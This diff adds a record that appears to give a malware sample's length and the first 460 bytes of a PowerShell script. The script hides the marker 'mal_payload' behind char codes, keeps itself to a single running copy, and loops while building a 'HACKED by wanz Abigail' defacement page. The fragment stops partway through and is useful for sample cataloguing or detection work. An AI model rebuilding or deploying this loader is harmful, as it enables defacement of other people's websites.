@@ -1,0 +1,2 @@
+len: 190710
+HEAD 460: b'$ProgressPreference="SilentlyContinue";$K=@($null,$null,$null,$null);$ptn=[char]109+[char]97+[char]108+[char]95+[char]112+[char]97+[char]121+[char]108+[char]111+[char]97+[char]100;if((Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID -and [Regex]::IsMatch($_.CommandLine,$ptn) }).Count -ge 1){exit}while($true){try{$ROOTDEF="<!doctype html><html><head><meta charset=utf-8><title>HACKED by wanz Abigail</title><style>body{marg'
